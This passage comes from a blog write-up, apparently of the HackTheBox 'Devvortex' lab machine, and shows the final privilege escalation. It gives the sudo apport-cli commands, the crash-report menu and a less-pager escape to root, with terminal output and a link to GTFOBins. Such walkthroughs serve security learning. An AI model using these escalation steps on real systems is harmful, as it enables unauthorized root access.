+</span></span><span class="line"><span class="cl">application. This might take a few minutes.
+</span></span><span class="line"><span class="cl">..........No journal files were opened due to insufficient permissions.
+</span></span><span class="line"><span class="cl">.............
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*** Send problem report to the developers?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">After the problem report has been sent, please fill out the form in the
+</span></span><span class="line"><span class="cl">automatically opened web browser.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What would you like to <span class="k">do</span>? Your options are:
+</span></span><span class="line"><span class="cl">  S: Send report <span class="o">(</span>325.4 KB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  V: View report
+</span></span><span class="line"><span class="cl">  K: Keep report file <span class="k">for</span> sending later or copying to somewhere <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  I: Cancel and ignore future crashes of this program version
+</span></span><span class="line"><span class="cl">  C: Cancel
+</span></span><span class="line"><span class="cl">Please choose <span class="o">(</span>S/V/K/I/C<span class="o">)</span>: K
+</span></span><span class="line"><span class="cl">Problem report file: /tmp/apport.linux-image-5.4.0-167-generic.0scxxl93.apport
+</span></span></code></pre></div><p>Let&rsquo;s try running this again with <code>sudo</code> to select <code>V: View report</code> instead of
+loading it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">logan@devvortex:~$ sudo /usr/bin/apport-cli -f --pid <span class="m">19212</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*** Collecting problem information
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The collected information can be sent to the developers to improve the
+</span></span><span class="line"><span class="cl">application. This might take a few minutes.
+</span></span><span class="line"><span class="cl">.........................
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*** Send problem report to the developers?
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">After the problem report has been sent, please fill out the form in the
+</span></span><span class="line"><span class="cl">automatically opened web browser.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What would you like to <span class="k">do</span>? Your options are:
+</span></span><span class="line"><span class="cl">  S: Send report <span class="o">(</span>693.0 KB<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  V: View report
+</span></span><span class="line"><span class="cl">  K: Keep report file <span class="k">for</span> sending later or copying to somewhere <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  I: Cancel and ignore future crashes of this program version
+</span></span><span class="line"><span class="cl">  C: Cancel
+</span></span><span class="line"><span class="cl">Please choose <span class="o">(</span>S/V/K/I/C<span class="o">)</span>:
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-11.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-11.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-11.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-11.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-11.png"
+        title="Apport Vulnerability" width="809" height="667" /></p>
+<p>It works! And we get the root flag.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-12.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-12.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-12.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-12.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-12.png"
+        title="Apport Exploited" width="801" height="573" /></p>
+<p>I later realised that the <code>apport-cli</code> command states that a program is accepted.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@devvortex:/home/logan# apport-cli -c
+</span></span><span class="line"><span class="cl">Usage: apport-cli <span class="o">[</span>options<span class="o">]</span> <span class="o">[</span>symptom<span class="p">|</span>pid<span class="p">|</span>package<span class="p">|</span>program path<span class="p">|</span>.apport/.crash file<span class="o">]</span>
+</span></span></code></pre></div><p>We could have done this instead:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/usr/bin/apport-cli -c /var/crash/some_crash_file.crash less
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-13.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-13.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-13.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-13.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-13.png"
+        title="Apport Exploited" width="795" height="446" /></p>
+<p>More info on using the <code>less</code> pager for privilege escalation:
+<a href="https://gtfobins.github.io/gtfobins/less/#sudo" target="_blank" rel="noopener noreffer ">https://gtfobins.github.io/gtfobins/less/#sudo</a>.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 12-11-2023</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2023-04-30-running-a-fully-automated-media-center/" class="prev" rel="prev" title="Running a Fully Automated Media Server"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Running a Fully Automated Media Server</a>
+            <a href="/posts/2023-12-13-hackthebox-surveillance/" class="next" rel="next" title="HackTheBox Surveillance">HackTheBox Surveillance<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2015 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://bchoy.me" target="_blank">Brian Choy</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-F9RPBWE7GE', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-F9RPBWE7GE" async></script></body>
+</html>
